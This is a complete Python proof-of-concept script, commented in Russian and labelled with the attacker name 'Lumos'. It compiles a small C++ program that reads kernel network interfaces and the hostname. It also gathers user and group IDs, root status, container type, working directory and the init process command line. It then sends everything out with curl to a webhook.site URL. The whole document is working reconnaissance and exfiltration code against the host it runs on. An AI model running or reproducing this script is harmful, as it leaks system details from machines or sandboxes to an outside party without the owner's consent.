import subprocess
import os
import json

# ТВОЙ ВЕБХУК
WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

cpp_source = r"""
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>

int main() {
    std::stringstream ss;
    ss << "--- [KERNEL NETWORK VIEW] ---\n";
    
    // Читаем интерфейсы напрямую из ядра (не нужен ip addr)
    std::ifstream netdev("/proc/net/dev");
    std::string line;
    if (netdev.is_open()) {
        while (std::getline(netdev, line)) {
            ss << line << "\n";
        }
    }

    // Проверяем возможность управления ядром (sysctl)
    std::ifstream hostname("/proc/sys/kernel/hostname");
    std::string host;
    if (hostname >> host) {
        ss << "\n--- [HOST IDENTIFICATION] ---\n";
        ss << "Hostname: " << host << "\n";
    }

    std::cout << ss.str();
    return 0;
}
"""

def run_poc():
    # 1. Готовим C++ бинарник
    with open("engine.cpp", "w") as f:
        f.write(cpp_source)
    
    subprocess.run(["g++", "-O3", "engine.cpp", "-o", "engine_bin"])

    # 2. Собираем данные
    try:
        cpp_output = subprocess.check_output(["./engine_bin"]).decode()
    except:
        cpp_output = "C++ Execution Failed"

    # Проверка на Docker/K8s окружение
    is_container = "Unknown"
    if os.path.exists("/.dockerenv"):
        is_container = "Docker"
    elif os.path.exists("/var/run/secrets/kubernetes.io"):
        is_container = "Kubernetes"

    # 3. Формируем JSON (это исправит синтаксис на вебхуке)
    report_data = {
        "status": "CRITICAL_SYSTEM_ACCESS",
        "attacker": "Lumos",
        "privileges": {
            "uid": os.getuid(),
            "gid": os.getgid(),
            "is_root": os.getuid() == 0
        },
        "environment": {
            "type": is_container,
            "cwd": os.getcwd(),
            "pid_1_cmd": open("/proc/1/cmdline").read().replace('\0', ' ')
        },
        "raw_payload": cpp_output
    }

    # 4. Отправка через CURL с JSON-заголовком
    json_payload = json.dumps(report_data, indent=4)
    
    subprocess.run([
        'curl', '-s', 
        '-X', 'POST', 
        '-H', 'Content-Type: application/json',
        '-d', json_payload, 
        WEBHOOK_URL
    ])

    print("[+] PoC Finished. Check your webhook for a clean JSON view.")

if __name__ == "__main__":
    run_poc()
